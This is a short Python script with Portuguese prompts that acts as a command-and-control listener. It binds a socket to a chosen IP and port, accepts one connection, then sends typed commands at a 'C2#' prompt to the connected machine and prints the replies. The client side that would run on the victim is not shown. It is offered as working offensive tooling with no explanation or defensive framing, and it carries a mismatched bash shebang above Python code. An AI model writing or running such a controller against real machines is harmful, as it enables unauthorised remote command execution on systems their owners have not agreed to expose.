#!/bin/bash

import socket
import sys

host = input("digite seu IP: ")
port = int(input("digite a porta: "))

server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server.bind((host,port))
server.listen()
print(f"Servidor em: {host}:{port}")

client, addr = server.accept()
print(f"conexao iniciada {addr}")

while True:
        cmd = input("C2# ")
        if cmd == "sair":
                 break
        client.send(cmd.encode())
        response = client.recv(4096)
        print(response.decode())
client.close()
server.close()
